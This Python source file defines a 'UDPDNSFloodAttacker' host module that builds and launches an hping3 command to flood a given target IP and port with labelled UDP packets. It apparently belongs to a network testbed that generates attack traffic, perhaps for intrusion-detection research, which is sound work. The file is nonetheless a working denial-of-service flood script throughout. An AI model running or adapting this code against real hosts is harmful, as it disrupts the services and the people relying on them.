#! /usr/bin/env python

from HostBehaviour import HostModule
import sys
import httplib
import time

import subprocess
import os

class UDPDNSFloodAttacker(HostModule):
	def __init__(self, *args):
		super(UDPDNSFloodAttacker, self).__init__(*args)

	def clientBehaviour(self):
		# parse parameters for the target/type of attack etc.

		payload = open("UDPDNSPayload.txt", "w")
		payload.write("class=%s" % self.trafficClass)
		payload.close()

		# dns udp flood
		bashCommand = "hping3 " + self.targetIPAddr + " -I eth0 -q -n --udp -d 40 -E UDPDNSPayload.txt -p "\
			+ str(self.targetPort) + " -s " + str(self.selfPort) + " --faster -c 300"

		subprocess.Popen(bashCommand.split())

if __name__ == '__main__':
	selfIPAddress = sys.argv[1]
	selfPort = int(sys.argv[2])
	targetIPAddress = sys.argv[3]
	targetPort = int(sys.argv[4])
	trafficClass = sys.argv[5]

	# the regular client takes the address and port assigned to it
	# the attacker will also need to include the address and the port it wishes to target

	host = UDPDNSFloodAttacker(selfIPAddress, int(selfPort), targetIPAddress, int(targetPort), trafficClass)
	host.clientExecute()
